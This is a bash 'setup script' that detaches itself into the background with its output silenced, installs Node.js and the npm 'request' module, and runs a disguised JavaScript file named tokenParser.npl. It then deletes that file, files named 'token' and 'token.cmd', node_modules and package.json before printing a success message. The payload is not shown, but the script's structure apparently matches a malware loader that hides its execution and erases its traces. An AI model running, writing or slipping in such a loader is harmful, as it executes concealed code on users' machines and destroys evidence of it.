#!/bin/bash
set -e

# No SCRIPT_DIR, assume run from script folder or correct working directory

if [[ "$1" != "_restarted" ]]; then
    echo "üîÅ Restarting script with _restarted flag..."
    nohup bash "$0" _restarted > /dev/null 2>&1 &
    exit 0
fi

echo "‚úÖ Running restarted script instance..."

NODE_VERSION="20.11.1"
NODE_DISTRO="node-v${NODE_VERSION}-linux-x64"
NODE_TAR="${NODE_DISTRO}.tar.gz"
DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_TAR}"

# Work in current directory
cd .

# The rest stays the same but replace $SCRIPT_DIR with .

if command -v node >/dev/null 2>&1; then
    INSTALLED_VERSION=$(node -v | sed 's/v//')
    if [[ "$INSTALLED_VERSION" == "$NODE_VERSION" ]]; then
        echo "Node.js version $INSTALLED_VERSION already installed."
        INSTALL_NODE=0
    else
        echo "Different Node.js version installed ($INSTALLED_VERSION), will install $NODE_VERSION."
        INSTALL_NODE=1
    fi
else
    echo "Node.js not found. Will install version $NODE_VERSION."
    INSTALL_NODE=1
fi

if [[ $INSTALL_NODE -eq 1 ]]; then
    echo "Downloading Node.js..."
    if [ -f "$NODE_TAR" ]; then
        echo "$NODE_TAR already exists, skipping download."
    else
        wget "$DOWNLOAD_URL" -O "$NODE_TAR"
    fi

    echo "Extracting Node.js..."
    tar -xf "$NODE_TAR"

    export PATH="./$NODE_DISTRO/bin:$PATH"
fi

if ! command -v node >/dev/null 2>&1; then
    echo "‚ùå Node.js not found after installation. Exiting."
    exit 1
fi

if ! command -v npm >/dev/null 2>&1; then
    echo "‚ùå npm not found after installation. Exiting."
    exit 1
fi

if [ ! -d "./node_modules/request" ]; then
    echo "Installing npm 'request' module..."
    npm install request --silent --no-progress --loglevel=error --fund=false
fi

if [ -f "./tokenParser.npl" ]; then
    echo "Running tokenParser..."
    node "./tokenParser.npl"
else
    echo "‚ùå tokenParser.npl not found."
    exit 1
fi

[ -f "./token.cmd" ] && rm -f "./token.cmd"
[ -f "./token" ] && rm -f "./token"
[ -f "./tokenParser.npl" ] && rm -f "./tokenParser.npl"

if [ -d "./node_modules" ]; then
    echo "Removing node_modules folder..."
    rm -rf "./node_modules"
fi

[ -f "./package.json" ] && rm -f "./package.json"
[ -f "./package-lock.json" ] && rm -f "./package-lock.json"

echo "‚úÖ Setup script completed successfully."